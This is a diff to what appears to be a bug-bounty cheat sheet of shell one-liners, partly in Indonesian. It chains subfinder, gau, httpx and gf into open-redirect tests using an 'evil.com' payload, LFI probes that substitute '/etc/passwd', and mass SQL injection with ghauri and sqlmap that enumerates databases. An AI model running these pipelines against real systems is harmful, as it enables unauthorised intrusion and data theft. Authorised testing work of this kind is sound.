@@ -89,7 +89,7 @@ cat hosts.txt | hakrawler -d 3 | anew urls.txt
 ```
 
 ```bash
-gau --subs < hosts.txt | sort -u | anew urls.txt
+gau --providers wayback,commoncrawl,otx,urlscan --subs < hosts.txt | sort -u | anew urls.txt
 ```
 
 
@@ -266,7 +266,7 @@ cat redirect_params.txt | qsreplace "https://evil.com" | httpx -silent -fr -mr "
 ```
 
 ```bash
-subfinder -d target.com -all | httpx -silent | gau | gf redirect | uro | qsreplace "https://evil.com" | httpx -silent -fr -mr "evil.com"
+subfinder -d target.com -all | httpx -silent | gau --providers wayback,commoncrawl,otx,urlscan | gf redirect | uro | qsreplace "https://evil.com" | httpx -silent -fr -mr "evil.com"
 ```
 
 bisa juga cek [disini](https://1amkaiz3ns-books.gitbook.io/bug-bounty/handbook/vulnerabilities/open-redirect/open-redirect) 
@@ -291,16 +291,23 @@ gau --providers wayback,commoncrawl,otx,urlscan target.com | gf lfi | qsreplace 
 echo 'https://target.com/index.php?page=' | httpx -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr "root:(x|\*|\$[^\:]*):0:0:"
 ```
 
+**Dari list urls**
+
+```bash
+cat urls.txt | gf lfi | qsreplace "/etc/passwd" | sort -u | \
+xargs -P 25 -I% sh -c 'curl -ks "%" | grep -qE "root:(x|\*):0:0:" && echo "[LFI] %"'
+```
+
 ## Additional Tools
 
 ### Content Type Filtering
 
 ```bash
-echo target.com | gau | grep -Eo '(\/[^\/]+)\.(php|asp|aspx|jsp|jsf|cfm|pl|perl|cgi|htm|html)$' | httpx -status-code -mc 200 -content-type | grep -E 'text/html|application/xhtml+xml'
+echo target.com | gau --providers wayback,commoncrawl,otx,urlscan | grep -Eo '(\/[^\/]+)\.(php|asp|aspx|jsp|jsf|cfm|pl|perl|cgi|htm|html)$' | httpx -status-code -mc 200 -content-type | grep -E 'text/html|application/xhtml+xml'
 ```
 
 ```bash
-echo target.com | gau | grep '\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'
+echo target.com | gau --providers wayback,commoncrawl,otx,urlscan | grep '\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'
 ```
 
 ### Miscellaneous
@@ -344,7 +351,7 @@ subfinder -d -l subdomains.txt -all -silent | httpx -td -sc -silent | grep -Ei '
 **Discover potential SQL injectable parameters using gau**
 
 ```bash
-echo https://target.com | gau | uro | grep -E '.php|.asp|.aspx|.jspx|.jsp' | grep '='
+echo https://target.com | gau --providers wayback,commoncrawl,otx,urlscan | uro | grep -E '.php|.asp|.aspx|.jspx|.jsp' | grep '='
 ```
 
 **Alternative method for finding SQL injectable endpoints using katana**
@@ -356,13 +363,13 @@ echo https://target.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienv
 **Mass SQL injection testing using ghauri**
 
 ```bash
-subfinder -d target.com -all -silent | gau --threads 50 | uro | gf sqli >sql.txt; ghauri -m sql.txt --batch --dbs --level 3 --confirm
+subfinder -d target.com -all -silent | gau --providers wayback,commoncrawl,otx,urlscan --threads 50 | uro | gf sqli >sql.txt; ghauri -m sql.txt --batch --dbs --level 3 --confirm
 ```
 
 **Comprehensive SQL injection testing using sqlmap**
 
 ```bash
-subfinder -d target.com -all -silent | gau | urldedupe | gf sqli >sql.txt; sqlmap -m sql.txt --batch --dbs --risk 2 --level 5 --random-agent
+subfinder -d target.com -all -silent | gau --providers wayback,commoncrawl,otx,urlscan | urldedupe | gf sqli >sql.txt; sqlmap -m sql.txt --batch --dbs --risk 2 --level 5 --random-agent
 ```
 
 ### Header-Based Injection
